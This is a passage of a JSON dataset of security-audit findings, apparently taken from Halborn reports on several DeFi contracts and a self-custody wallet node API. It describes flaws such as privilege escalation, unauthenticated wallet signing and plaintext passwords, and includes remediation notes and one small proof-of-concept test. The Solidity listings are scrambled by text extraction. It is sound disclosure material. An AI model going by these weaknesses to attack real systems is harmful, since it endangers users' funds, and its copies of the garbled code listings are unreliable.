        "labels": [
            "Halborn",
            "ERD_Ethereum_Reserve_Dollar",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING A CAP FOR EUSD GAS COMPENSATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The owner of the CollateralManager.sol contract, when setting the EUSD_GAS_COMPENSATION protocol parameter within setGasCompensation() function, there are no checks regarding the quantity being set. Code Location: Listing 7: CollateralManager.sol (Line 756) 755 function setGasCompensation ( uint256 _gas ) external override  onlyOwner { EUSD_GAS_COMPENSATION = _gas ; 756 757 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) Recommendation: An important parameter for the protocol as is EUSD_GAS_COMPENSATION, which plays a vital role, it is strongly recommended to set a cap for it. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 1961c7fc04181f770468d575b5b402a07b8ab239 26 ",
        "labels": [
            "Halborn",
            "ERD_Ethereum_Reserve_Dollar",
            "Severity: Informational"
        ]
    },
    {
        "title": "LONG LITERAL UINT256 USED IN COLLATERALMANAGER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Critical protocol parameters are set within the initialize() function of Specifically, MCR (minimum collateral CollateralManager.sol contract. ratio) and CCR (critical collateral ratio) are set using a long literal. This can lead to confusion on the percentages configured for the correct functionality of the whole protocol. Code Location: Listing 8: CollateralManager.sol (Lines 63,64) __Ownable_init () ; BOOTSTRAP_PERIOD = 14 days ; MCR = 1100000000000000000; // 110% CCR = 1300000000000000000; // 130% EUSD_GAS_COMPENSATION = 200 e18 ; MIN_NET_DEBT = 1800 e18 ; BORROWING_FEE_FLOOR = ( DECIMAL_PRECISION / 10000) * 75; // 60 function initialize () public initializer { 61 62 63 64 65 66 67  0.75% 68 69  0.75% 70 71 72 } RECOVERY_FEE = ( DECIMAL_PRECISION / 10000) * 25; // 0.25% MAX_BORROWING_FEE = ( DECIMAL_PRECISION / 100) * 5; // 5% REDEMPTION_FEE_FLOOR = ( DECIMAL_PRECISION / 10000) * 75; // BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) 27 Recommendation: To avoid any confusion or human errors while setting those parameters, the use of exponentiation (11e17, 13e17, etc.) is recommended instead. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 0aaf1539e5897aca96034f20f82a0ec1a8d45182 28 ",
        "labels": [
            "Halborn",
            "ERD_Ethereum_Reserve_Dollar",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING REQUIREISCONTRACT CHECK IN COLLATERALMANAGER.SETADDRESSES(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the CollateralManager.sol contract, when setting the contract ad- dresses using setAddresses(), the _requireIsContract() check is missing for _troveManagerRedemptionsAddress. Code Location: Listing 9: CollateralManager.sol (Line 98) 74 function setAddresses ( address _activePoolAddress , 75 address _borrowerOperationsAddress , 76 address _defaultPoolAddress , 77 address _priceFeedAddress , 78 address _troveManagerAddress , 79 address _troveManagerRedemptionsAddress , 80 address _wethAddress 81 82 ) external override onlyOwner { 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 _requireIsContract ( _activePoolAddress ); _requireIsContract ( _borrowerOperationsAddress ); _requireIsContract ( _defaultPoolAddress ); _requireIsContract ( _priceFeedAddress ); _requireIsContract ( _wethAddress ); _requireIsContract ( _troveManagerAddress ); borrowerOperationsAddress = _borrowerOperationsAddress ; activePool = IActivePool ( _activePoolAddress ); defaultPool = IDefaultPool ( _defaultPoolAddress ); priceFeed = IPriceFeed ( _priceFeedAddress ); wethAddress = _wethAddress ; troveManager = ITroveManager ( _troveManagerAddress ); 29 troveManagerRedemptionsAddress = 98  _troveManagerRedemptionsAddress ; 99 100 101 emit ActivePoolAddressChanged ( _activePoolAddress ); emit BorrowerOperationsAddressChanged (  _borrowerOperationsAddress ); emit DefaultPoolAddressChanged ( _defaultPoolAddress ); emit PriceFeedAddressChanged ( _priceFeedAddress ); emit TroveManagerAddressChanged ( _troveManagerAddress ); emit TroveManagerRedemptionsAddressChanged ( _troveManagerRedemptionsAddress ); emit WETHAddressChanged ( _wethAddress ); 102 103 104 105 106 107 108 109 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) Recommendation: as is the case with When the address needs to be a contract, _troveManagerRedemptionsAddress, it is recommended to check it as done for the rest of the parameters. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : f77899108075aef9f90e1e31ab4e1ab22c20d89c 30 MANUAL TESTING 31 The main goal of the manual testing performed during this assessment was to test all the functionalities regarding the ERD stablecoin overall protocol, focusing on the following points/scenarios: 1. Tests focused on borrowing EUSD and adding collateral to the troves (as a borrower of the protocol and using multiple collateral tokens)  Open a new trove with ERC20 tokens as collateral.  Open a new trove with ETH as collateral.  Add more collateral to the troves.  Check how the new ICR is calculated.  Check how the new index of the trove is calculated and reinserted. G N I T S E T L A U N A M 32 2. Tests focused on repaying EUSD and withdrawing collateral from the troves (as a borrower of the protocol and using multiple collateral tokens)  Repay 50% of the trove debt.  Withdraw some collateral from the trove.  Check how the new ICR is calculated.  Check how the new index of the trove is calculated and reinserted.  Check if exist a situation where the borrower cannot repay the debt. G N I T S E T L A U N A M 33 3. Tests focused on providing liquidity to the stability pool (as an SP depositor of the protocol)  Only one depositor on the system as liquidity provider to the sta- bility pool.  More than one depositor as liquidity providers in the protocol.  Check the flow of the EUSD and collaterals tokens when active troves are updated.  Check the flow of the EUSD and collaterals tokens when a trove is liquidated. G N I T S E T L A U N A M 34 4. Tests focused on withdrawing liquidity from the stability pool (as an SP depositor of the protocol)  Depositor of EUSD withdrawing liquidity from the stability pool.  Check how the TCR is being affected.  Check how the shares of depositors are being recalculated. G N I T S E T L A U N A M 35 5. Tests focused on liquidations (checking the mode of the protocol and the different scenarios for closing the troves and distributing the rewards)  Basic checks when ICR < MCR, the trove can be liquidated.  Basic checks when ICR > MCR and TCR < CCR, the trove can be liquidated as well. G N I T S E T L A U N A M 36 6. Tests depending on the current mode of the protocol (normal or recovery mode, to check which protocol actions are permitted and not permitted during recovery mode)  Check if actions that mint EUSD are not permitted during recovery mode.  Check if actions that burn EUSD are incentivized for users during recovery mode. G N I T S E T L A U N A M 37 7. Combine and perform integration tests with all the critical func- tionalities within the protocol (borrowers, depositors, liquidators, redeemers)  Set 4 depositors as liquidity providers to the stability pool.  Set 4 borrowers of EUSD.  Set 2 redeemers of EUSD.  Change the price of the collateral in the oracle.  Redeemers redeem collateral.  Troves being liquidated.  Check the flow of EUSD and collateral tokens and check the priority collateral logic is properly working. G N I T S E T L A U N A M 38 8. Deeply test all the possible cases of the system state and a specific trove being liquidated to ensure distributions of collaterals and rewards are correctly done as explained within the documentation (between depositors, active troves and the different pools).  ICR < MCR & SP.EUSD >= trove.debt & TCR >= 130%  ICR < MCR & SP.EUSD < trove.debt & TCR >= 130%  ICR < MCR & SP.EUSD = 0 & TCR >= 130%  ICR <=100% & TCR < 130%  100% < ICR < MCR & SP.EUSD > trove.debt & TCR < 130%  100% < ICR < MCR & SP.EUSD < trove.debt & TCR < 130%  MCR <= ICR < TCR & SP.EUSD >= trove.debt & TCR < 130% G N I T S E T L A U N A M 39 9. Tests focused on using multiple collaterals instead of just one type, and analyze how the protocol handles the different user actions involved  Add support for multiple collateral tokens.  Check how the system handles when priority collateral logic is executed.  Check how collaterals are calculated when opening a trove.  Check how collaterals are recalculated when adding a specific col- lateral to an already active trove.  Check how the system merges the ETH with collaterals into the protocol collaterals array. G N I T S E T L A U N A M 10. Moreover, and very importantly, theoretically review all cases to make sure contracts have the correct business logic for the proper functionality of the stablecoin overall protocol 40 ",
        "labels": [
            "Halborn",
            "ERD_Ethereum_Reserve_Dollar",
            "Severity: Informational"
        ]
    },
    {
        "title": "API",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Inside the user_router within the create_user function which is respon- sible for creating new users, it was noted that the function requires only an authenticated user without any special permissions. The user parameter within create_user is based on the UserCreate schema which includes user_role, the attacker can provide any role within the request and create a user with any role, including the admin role. Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to restrict user creation to the admin role only and remove user_role from UserCreate request schema. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding the permission checking class. 6e0368d70f706452d4bc940c08beec485ebd6093 12 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Critical"
        ]
    },
    {
        "title": "API",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Within the user_router inside the delete_user function which is respon- sible for deleting any user on the system, it was noted that the function requires only an authenticated user without any special permissions to delete any user on the system, including admin users. Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to restrict the delete user function to the admin role only. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding the permis- sions check class. 6e0368d70f706452d4bc940c08beec485ebd6093 13 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Critical"
        ]
    },
    {
        "title": "ARCHITECTURE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The authorization scheme within the API was observed, which allows an attacker to interact with the Node and perform privileged actions such as axie_claim or even sign transactions and interact with wallets by only sending the wallet address as an HTTP parameter. Relying on addr just to interact with a wallet object and retrieve the private key for that wallet is not enough, as it does not provide an authentication layer for wallets. Multiple critical functions were found for this issue, such as wallet_web3_sign and wallet_web3_interaction. Risk Level: Likelihood - 5 Impact - 5 Recommendation: Only privileged accounts (Admin) should be able to interact with wallets for privileged operations. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding the OTP Password in critical functions. 815fc73bc5f0dac4c7cb2544bcd249f45aa08135 14 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Critical"
        ]
    },
    {
        "title": "CRYPTOGRAPHY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Self-Custody, stores the wallet related data and private keys within a database, however, it was observed that the wallet password was stored in a plain text format without any hashing or encryption, meanwhile, the response scheme was observed to return the password in the HTTP response. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the password from the HTTP response and not store the wallet password in plain text within the database and use that password as a second verification or authentication method within wallet related operations. Remediation Plan: ACKNOWLEDGED: The Playground Labs team acknowledged this finding and the severity has been changed to informational. 15 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Informational"
        ]
    },
    {
        "title": "ARCHITECTURE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Self-Custody, authentication system and API implementation in general were found to lack the rate limit mechanism, which in turn exposes the Self-Custody, to brute force and denial of service attacks at the level of the application logic. Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to implement a rate limit mechanism and user lockout policy to defend against brute force attacks. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding an application level rate limit. de794da9109a1f9fe8c1cdf74c9dba9511148834 16 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Medium"
        ]
    },
    {
        "title": "API",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "A user enumeration vulnerability was observed within the login endpoint, a malicious actor can brute force valid usernames to find valid users on the system and use them in other attack scenarios. Recommendation: It is recommended to remove any response from the login process indicating that the user is valid or invalid and return a generic error message such as invalid username or password.. Remediation Plan: SOLVED: 815fc73bc5f0dac4c7cb2544bcd249f45aa08135 Playground Labs team The solved the issue in commit 17 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Medium"
        ]
    },
    {
        "title": "LOG MANAGEMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The HTTP Server within Self-Custody, was observed to be logging HTTP requests at an early stage with the HTTP body. The attacker can fill the disk with logs simply by sending simple HTTP requests with large chunks of data within the request body to the Custody HTTP Server. Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to log the request body only when debugging is enabled. Remediation Plan: SOLVED: fd692d0763b9696c24f036abbb25ec6c78dabb89 Playground Labs team The solved the issue in commit 18 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Low"
        ]
    },
    {
        "title": "ARCHITECTURE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the user creation process, it was observed that a weak password policy was applied during the creation of the users password hash, as it is only checks if the password is longer than 8 characters, which is not enough as a password strength baseline. Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to enforce a stricter password policy that ensures that the users password contains uppercase, lowercase, non-alphanumeric characters, and is longer than 8 characters. Remediation Plan: SOLVED: 3f325accdbc5824f147a986f35606ef049224e2f Playground Labs team The solved the issue in commit 19 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Low"
        ]
    },
    {
        "title": "ARCHITECTURE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was noted that the authentication system within the Self-Custody, lacks a two-factor authentication mechanism. In case of credentials theft, the attacker can perform privileged operations such as transactions and interact with other critical functions. Risk Level: Likelihood - 3 Impact - 2 Recommendation: Two-factor authentication is recommended to reduce the impact of creden- tial theft attacks. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding the OTP Password in critical functions. ebda4a69fee55bf67501eede7777a5d06fc77a4a 20 3.10 (HAL-10) HTTP - MISCONFIGURED CORS - LOW ",
        "labels": [
            "Halborn",
            "Playground_Labs_Self_Custody_Node",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE EXTERNAL CALL FEE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The wormhole publishMessage function is payable. Currently, requires no fees, but that can be changed over time. If the wormhole decides to set a fee greater than 0, all those external calls within the protocol would fail. Hence, leaving the wormhole routers unable to perform their critical tasks. Code Location: Listing 1: L2WormholeRouter.sol (Line 33) require ( msg . sender == address ( vault ) , \" Only vault \" ); bytes memory payload = abi . encode ( Constants . 29 function reportTransferredFund ( uint256 amount ) external { 30 31  L2_FUND_TRANSFER_REPORT , amount ); 32 33  consistencyLevel ); 34 } 35 uint64 sequence = wormhole . nextSequence ( address ( this )) ; wormhole . publishMessage ( uint32 ( sequence ) , payload , Listing 2: L2WormholeRouter.sol (Line 40) require ( msg . sender == address ( vault ) , \" Only vault \" ); bytes memory payload = abi . encode ( Constants . L2_FUND_REQUEST , 36 function requestFunds ( uint256 amount ) external { 37 38  amount ); 39 40  consistencyLevel ); 41 } 42 uint64 sequence = wormhole . nextSequence ( address ( this )) ; wormhole . publishMessage ( uint32 ( sequence ) , payload , 15 Listing 3: L1WormholeRouter.sol (Line 37) // NOTE : We use the current tx count ( to wormhole ) of this // as a nonce when publishing messages // This casting is fine so long as we send less than 2 ** 32 - require ( msg . sender == address ( vault ) , \" Only vault \" ); bytes memory payload = abi . encode ( Constants . L1_TVL , tvl , 29 function reportTVL ( uint256 tvl , bool received ) external { 30 31  received ); 32  contract 33 34  1 (~ 4 billion ) messages 35 36 37  consistencyLevel ); 38 } 39 uint64 sequence = wormhole . nextSequence ( address ( this )) ; wormhole . publishMessage ( uint32 ( sequence ) , payload , Listing 4: L1WormholeRouter.sol (Line 45) uint64 sequence = wormhole . nextSequence ( address ( this )) ; require ( msg . sender == address ( vault ) , \" Only vault \" ); bytes memory payload = abi . encode ( Constants . 40 function reportTransferredFund ( uint256 amount ) external { 41 42  L1_FUND_TRANSFER_REPORT , amount ); 43 44 45  consistencyLevel ); 46 } 47 wormhole . publishMessage ( uint32 ( sequence ) , payload , Proof of Concept: 1. Wormhole publishMessage function increase its fee transaction 2. Affine DeFi wormhole routers fail to publish messages due to not sending any fee on the transaction 3. Affine DeFi overall protocol does not properly work 16 Risk Level: Likelihood - 1 Impact - 5 Recommendation: Considering the need to call publishMessage, paying transaction fees is strongly recommended. Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 17 ",
        "labels": [
            "Halborn",
            "Affine_DeFi_Multiplyr",
            "Severity: Medium"
        ]
    },
    {
        "title": "POSSIBLE LOSS OF FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Wormhole does not fail if the destination chain ID is different from the one supposed to be. If the rebalancer bot calls this function directly with a different chain ID, it will not fail, so funds during the transactions can be lost. You can check the Wormhole Chain IDs on each chain, which is not the same as the network chain ID and can be easily confused. Code Location: Listing 5: WormholeRouter.sol (Line 43) require ( vm . emitterAddress == bytes32 ( uint256 ( uint160 ( 41 function _validateWormholeMessageEmitter ( IWormhole . VM memory vm )  internal view { 42  otherLayerRouter ))) , \" Wrong emitter address \"); 43  chain \"); 44 45 } 46 require ( vm . nonce >= nextValidNonce , \" Old transaction \" ); require ( vm . emitterChainId == otherLayerChainId , \" Wrong emitter Proof of Concept: 1. Confuse wormhole chain ID with network chain ID 2. Initialize the contract with a wrong wormhole chain ID 3. Execute transactions on the protocol 4. Validate wormhole message emitter does not work as intended 18 Risk Level: Likelihood - 1 Impact - 5 Recommendation: Creating a Chain ID whitelist with all the possible Chain IDs or having it hardcoded within the contract is recommended. Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 19 ",
        "labels": [
            "Halborn",
            "Affine_DeFi_Multiplyr",
            "Severity: Medium"
        ]
    },
    {
        "title": "POSSIBLE UNPREDICTABILITY BETWEEN L2 AND L1 RATIOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When setLayerRatios function is used to update the ratio between L1 and Hence, the L2, an invalid total ratio can be set (more than 100%). rebalancer bot could not properly work in those cases. Code Location: Listing 6: L2Vault.sol (Lines 450,451) 449 function setLayerRatios ( uint256 _l1Ratio , uint256 _l2Ratio )  external onlyGovernance { l1Ratio = _l1Ratio ; l2Ratio = _l2Ratio ; 450 451 452 } 453 Risk Level: Likelihood - 2 Impact - 3 Recommendation: When setting the ratios, making sure the total ratio is equal to 100% is recommended. Remediation Plan: RISK ACCEPTED: The Affine DeFi team accepted the risk of this finding. 20 ",
        "labels": [
            "Halborn",
            "Affine_DeFi_Multiplyr",
            "Severity: Low"
        ]
    },
    {
        "title": "FUNCTION DOES NOT CHECK THE TOKEN BALANCE BEFORE AND AFTER A CALL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Whenever the exit function is used, the contract should check the token balance before and after the call. So, the exact amount of tokens sent can be properly checked. Code Location: Listing 7: BridgeEscrow.sol (Line 64) require ( msg . sender == wormholeRouter , \" Only wormhole router \"); // Exit tokens , after that the withdrawn tokens from L2 will rootChainManager . exit ( exitProof ); 60 function l1ClearFund ( uint256 amount , bytes calldata exitProof )  external { 61 62 63  be reflected in L1 BridgeEscrow . 64 65 66 67 68 69 70 71 72 73 74 } 75 // Transfer exited tokens to L1 Vault . uint256 balance = token . balanceOf ( address ( this )) ; require ( balance >= amount , \" Funds not received \" ); IL1Vault l1Vault = IL1Vault ( vault ); token . safeTransfer ( address ( l1Vault ) , balance ); l1Vault . afterReceive () ; Risk Level: Likelihood - 2 Impact - 2 21 Recommendation: Checking the token balance before and after the exit call is recommended. Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 22 ",
        "labels": [
            "Halborn",
            "Affine_DeFi_Multiplyr",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF PROPER SLIPPAGE PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Within the _claimAndSellRewards function, the slippage protection of the transaction is set to zero. Hence, if there is tiny liquidity, there is a high risk of losing part of the investment. Code Location: Listing 8: L1CompoundStrategy.sol (Line 127) uint256 rewardTokenBalance = balanceOfRewardToken () ; if ( rewardTokenBalance >= minRewardToSell ) { _sellRewardTokenForWant ( rewardTokenBalance , 0) ; comptroller . claimComp ( address ( this )) ; if ( rewardToken != address ( cToken )) { 122 function _claimAndSellRewards () internal { 123 124 125 126 127 128 129 130 131 } 132 } return ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Setting at least 5% slippage protection is recommended. 23 Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 24 ",
        "labels": [
            "Halborn",
            "Affine_DeFi_Multiplyr",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF CHAIN ID",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Affine_DeFi_Multiplyr_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When initializing the wormhole router, the wormhole chain ID can be misused. As can be wrongly set due to confusion with the different deployed chain IDs. As mentioned on HAL02, you can check the Wormhole Chain IDs on each chain, which is not the same as the network chain ID and can be easily confused. Code Location: Listing 9: L2WormholeRouter.sol (Line 26) external initializer 18 function initialize ( IWormhole _wormhole , L2Vault _vault , address  _otherLayerRouter , uint16 _otherLayerChainId ) 19 20 21 { 22 23 24 25 26 27 } 28 wormhole = _wormhole ; vault = _vault ; governance = vault . governance () ; otherLayerRouter = _otherLayerRouter ; otherLayerChainId = _otherLayerChainId ; Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: As mentioned on HAL02, creating a Chain ID whitelist with all the possible Chain IDs or having it hardcoded within the contract is recommended. Remediation Plan: SOLVED: The Affine DeFi team solved the issue in commit: 06d6bc37fa80f0fdf794a8cb93e8100288d065e0 26 ",
        "labels": [
            "Halborn",
            "Affine_DeFi_Multiplyr",
            "Severity: Informational"
        ]
    },
    {
        "title": "SAME PAIR OF TOKENS CAN BE USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "It is observed that in forward() and swapAndSend() functions inside ReceivingForwarder.sol and in CrosschainForwarder.sol does not check if source token type equals to destination token type and accepts same pair of tokens as input. This type of bugs may lead to critical attack vectors or griefing attacks. Code Location: ReceivingForwarder.sol  forward Listing 1: ReceivingForwarder.sol (Lines 30,33) 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 function forward ( address _dstTokenIn , address _router , bytes memory _routerCalldata , address _dstTokenOut , address _fallbackAddress ) external payable override { if ( _dstTokenIn == NATIVE_TOKEN ) { return _forwardFromETH ( _router , _routerCalldata , _dstTokenOut , _fallbackAddress ); } else { return _forwardFromERC20 ( IERC20Upgradeable ( _dstTokenIn ) , _router , 13 48 49 50 51 _routerCalldata , _dstTokenOut , _fallbackAddress ); CrosschainForwarder.sol  swapAndSend Listing 2: LPConnector.sol (Lines 47,52) function swapAndSend ( address _srcTokenIn , uint _srcAmountIn , bytes memory _srcTokenInPermit , address _srcSwapRouter , bytes calldata _srcSwapCalldata , address _srcTokenOut , bytes calldata _dstDetails ) external payable override { if (! supportedRouters [ _srcSwapRouter ]) revert uint ethBalanceBefore = address ( this ). balance - msg . value ; uint srcAmountOut ; if ( _srcTokenIn == NATIVE_TOKEN ) { _validateSrcETHIn ( _srcAmountIn ); srcAmountOut = _swapToERC20Via ( _srcSwapRouter , _srcSwapCalldata , _srcAmountIn , IERC20Upgradeable ( _srcTokenOut ) 46 47 48 49 50 51 52 53 54 55  NotSupportedRouter () ; 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 } else { ... ); 14 Proof of Concept: In the Proof of Concept below, we created a test script which gives same input token type for source and destination. Listing 3: Proof of concept it ( ' Same pair of tokens ' , async () = > { await state . usdToken . instance . mint ( state . user . address , usd2v console . log ( await state . usdToken . instance . balanceOf ( state . await state . receivingForwarder . instance . connect ( state . user ) state . usdToken . instance . address , // _wrappedToken state . dex . instance . address , // _router SAMPLE_CALLDATA . swap . sample , // _routerCalldata state . usdToken . instance . address , // _targetToken state . user . address , // _fallbackAddress console . log ( await state . usdToken . instance . balanceOf ( state . . forward ( 1 2  (10) ); 3  user . address )); 4 5 6 7 8 9 10 11 12 13 14  user . address )); }) ; 15 ); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to ensure that source and destination tokens are not of the same type. 15 Remediation Plan: NOT APPLICABLE: The issue is marked as not applicable by the DeBridge team with an explanation: Both CrosschainForwarder and ReceivingForwarder work as relayers: they take tokenIn from msg.sender, swap it to tokenOut via the swapRouter, then pass the resulting tokenOut along with deBridgeGate or the destination address. It seems that there is nothing wrong with the situation when both tokens are the same. Moreover, this opens broad possibilities for arbitrage. 16 ",
        "labels": [
            "Halborn",
            "deBridge_Cross_Chain_Swap",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING PAUSEABLE FUNCTIONALITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "Even code that has been thoroughly audited and tested may contain bugs or defective code parts. These flaws are frequently undetected until they are employed in an attack by an opponent. Because immutability is one of the basic characteristics of the blockchain, it is difficult to correct if a critical fault is discovered. While some patterns (such as the Proxy Delegate pattern) allow for upgradeable code to some extent, these solutions normally take a long time to implement and come into action. Before the update is transmitted to the network, the attackers could continue with their malicious actions and cause harm. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add an option to disable critical contract func- tionality in case of an emergency. Remediation Plan: NOT APPLICABLE: The issue is marked as not applicable by the DeBridge team with an explanation: ReceivingForwarder and CrosschainForwarder communicate with the deBridgeGate contract. If we ever need to stop the contracts, we can either stop deBridgeGate or quickly upgrade the proxy to a fixed or paused implementation. 17 ",
        "labels": [
            "Halborn",
            "deBridge_Cross_Chain_Swap",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The return value of an external call is not stored in a local or state vari- able. In CrosschainForwarder.sol, LPConnector.sol and ReceivingForwarder .sol contracts, there are few instances where external methods are being called using approve and return values(bool) are being ignored. Code Location: CrosschainForwarder.sol  swapAndSend Listing 4: CrosschainForwarder.sol 74 srcTokenIn . approve ( _srcSwapRouter , srcAmountOut ); Listing 5: CrosschainForwarder.sol 82 srcTokenIn . approve ( _srcSwapRouter , srcAmountOut );  _sendToBridge Listing 6: CrosschainForwarder.sol 215 IERC20Upgradeable ( token ). approve ( address ( deBridgeGate ) , 0) ; LPConnector.sol  swapFrom 18 Listing 7: LPConnector.sol 77 _tokenIn . approve ( target . pool , _amountIn ); Listing 8: LPConnector.sol 86 _tokenIn . approve ( target . router , _amountIn ); Listing 9: LPConnector.sol 98 _tokenIn . approve ( target . pool , 0) ; ReceivingForwarder.sol  _forwardFromERC20 Listing 10: ReceivingForwarder.sol 97 dstTokenIn . approve ( _router , dstTokenInAmount ); Listing 11: ReceivingForwarder.sol 109 dstTokenIn . approve ( _router , 0) ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add return value checks to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. 19 Remediation Plan: PENDING: The issue was acknowledged by the DeBridge team and will be fixed later. 20 ",
        "labels": [
            "Halborn",
            "deBridge_Cross_Chain_Swap",
            "Severity: Informational"
        ]
    },
    {
        "title": "COGNITIVE COMPLEXITY OF FUNCTION IS TOO HIGH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf",
